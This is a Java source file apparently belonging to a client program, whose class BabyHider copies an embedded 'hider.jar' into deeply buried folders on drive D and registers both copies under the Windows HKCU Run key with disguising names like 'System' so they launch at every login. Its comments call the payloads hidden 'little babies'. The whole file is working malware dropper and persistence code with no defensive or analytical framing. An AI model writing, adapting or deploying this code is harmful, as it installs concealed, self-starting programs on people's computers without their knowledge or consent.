package com.client;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

public class BabyHider{

	
	public BabyHider(){
	}
	
	public void startDoIt() {
		String path1 = searchForLivePlace(2) + "\\runnable.jar";
		BufferedInputStream firstIn = inputFromSource("/lib/hider.jar");
		//寻找第二个位置
		String path2 = searchForLivePlace(4) + "\\constant.jar";
		BufferedInputStream secondIn = inputFromSource("/lib/hider.jar");						
		String myAppName1 = "System";
		String myAppName2 = "CONSTANT";
		//隐藏并自动启动这两个小宝贝
		hiddenBabyAndMakeItAuto(myAppName1, path1, firstIn);
		hiddenBabyAndMakeItAuto(myAppName2, path2, secondIn);
	}
	
	
	/**
	 * 一直进入index数字为序号索引的文件夹
	 * @param index
	 * @return
	 */
	public static String searchForLivePlace(int index) {
		File dir = new File("d:/");
		String filePath = "d:/";
		while (true) {
			String[] files = GetSystemFiles.getFiles(filePath);
			if(dir.isDirectory() && files!=null && files.length >0) {
				filePath = files[0];
				dir = new File(filePath);
				
				for(int i = index-1; i < files.length ; i++) {
					filePath = files[i];
					dir = new File(filePath);
					//System.out.println(filePath);
					if(dir.isDirectory())
						break;
				}
				
			}else {
				break;
			}
			
		}
		filePath = dir.getParent();
		return filePath;		
	}
	
	
	/**
	 * 
	 * @param startName
	 * @param path
	 * @param babyInput
	 */
	//隐藏小宝贝并且修改注册表
	public static void hiddenBabyAndMakeItAuto(String startName,
			String path,BufferedInputStream babyInput) {				
		byte[] buf = new byte[1024];
		int len;
		
		BufferedOutputStream babyFileOut;
		try {
			babyFileOut = new BufferedOutputStream(
					new FileOutputStream(path));
			while ((len = babyInput.read(buf)) != -1) {
				babyFileOut.write(buf, 0, len);
			}
			babyInput.close();
			babyFileOut.flush();
			babyFileOut.close();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		makeItAutoStartUp(startName, path);
		
	}
	
	/**
	 * 
	 * @param startName
	 * @param path
	 */
	//修改注册表
	public static void makeItAutoStartUp(String startName,String path) {
		String regKey = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		try {
			Runtime.getRuntime().exec("reg add " + regKey + " /v " + startName
					+ " /t reg_sz /d " + path);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	/**
	 * 
	 * @param file
	 * @return
	 */
	public static BufferedInputStream inputFromSource(String file) {
		BufferedInputStream in = new BufferedInputStream(Go.class.getResourceAsStream(file));
		return in;

	}
}
